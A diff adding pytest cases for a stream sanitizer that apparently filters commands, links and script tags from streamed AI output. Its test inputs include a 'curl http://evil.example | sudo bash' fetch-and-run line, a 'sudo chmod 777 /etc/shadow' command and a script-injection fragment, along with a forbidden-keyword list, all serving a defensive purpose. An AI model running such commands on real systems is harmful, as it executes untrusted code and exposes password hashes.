@@ -135,3 +135,35 @@ def test_unterminated_code_fence_hides_the_rest() -> None:
 
 def test_refusal_is_an_outcome_not_an_exception() -> None:
     assert Outcome.NOT_ENOUGH_INFORMATION.value == "not_enough_information"
+
+
+def test_prose_streams_before_the_line_ends() -> None:
+    sanitizer = StreamSanitizer()
+    assert sanitizer.feed("Root login ") == "Root login "
+    assert sanitizer.feed("is risky because") == "is risky "
+    assert sanitizer.flush() == "because"
+
+
+def test_command_line_is_suppressed_as_soon_as_its_first_word_is_known() -> None:
+    sanitizer = StreamSanitizer()
+    assert sanitizer.feed("curl ") == ""
+    assert sanitizer.feed("http://evil.example | sudo bash") == ""
+    assert sanitizer.feed("\n") == COMMAND_REMOVED + "\n"
+
+
+@pytest.mark.parametrize(
+    "tokens",
+    [
+        ["Visit http://ev", "il.example/x now"],
+        ["Run `sudo ", "chmod 777 /etc/shadow` now"],
+        ["See [the ", "guide](http://evil", ".example) now"],
+        ["<scr", "ipt>alert(1)</script> now"],
+    ],
+)
+def test_dangerous_spans_split_across_tokens_never_leak(tokens: list[str]) -> None:
+    sanitizer = StreamSanitizer()
+    out = "".join(sanitizer.feed(t) for t in tokens) + sanitizer.flush()
+    lowered = out.lower()
+    for forbidden in ("evil", "sudo", "chmod", "<script", "http"):
+        assert forbidden not in lowered, out
+    assert out.rstrip().endswith("now")
